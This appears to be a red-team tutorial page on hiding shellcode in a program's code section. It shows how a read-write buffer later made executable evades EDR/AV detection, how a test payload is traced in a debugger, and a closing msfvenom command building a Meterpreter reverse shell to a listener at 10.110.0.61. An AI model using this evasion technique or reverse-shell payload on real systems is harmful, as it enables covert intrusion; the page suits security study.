# Code section

## Payload in code section

Note: EDR and AV software are most of the time looking for action like memory buffer allocation to \(read write and execute\) at the same time. One way to bypass that is to create the buffer, set readwrite permission first and then, make it executable.

**Payload is stored into the main function as a local variable**

* Set the memory buffer to Read and Write

`exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`

* Set the memory buffer to Executable and Read

`rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);`

### Payload \(0xCC \| INT3 allows the debugger to take control of the process, for testing purpose\)

```cpp
unsigned char payload[] = {
        0x90,        // NOP
        0x90,        // NOP
        0xcc,        // INT3
        0xc3        // RET
    };
```

#### Find pattern

Launch the process and attach it to the debugger. Go to `memory map` and search for the payload :

![](../../../../../.gitbook/assets/1a5f36f75b2f4784b0b342157c3b8394.png)

Get the memory addresses and search for them in "Memory Map" \(Note: it's a range\)

![](../../../../../.gitbook/assets/e4ce2a4460d343bda03c8f18646a00fd.png)

#### The payload is on the Stack

**local variable are located on stack**

![](../../../../../.gitbook/assets/55e2071510144db1a36194d4bdb21a8d.png)

#### Next one \(exec mem\)

From our code \(set Exec & read\)

`rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);`

![](../../../../../.gitbook/assets/c4646a1cee884cf080205fd592bc7488.png)

Note: Last column \(initial, -RW--\) correspond to the previous permission used here :

`exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`

#### Last one

Text section, Executable

![](../../../../../.gitbook/assets/3c26a25023b742989620d538db0f67b2.png)

* Follow it in Assembly

![](../../../../../.gitbook/assets/8a543f2cbb7a46c2a2eeeeb9e21bc2f6.png)

### Weaponize it

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.110.0.61 LPORT=443 -f c`

![](../../../../../.gitbook/assets/8cfd6014130849cab01aa94f235a77af.png)

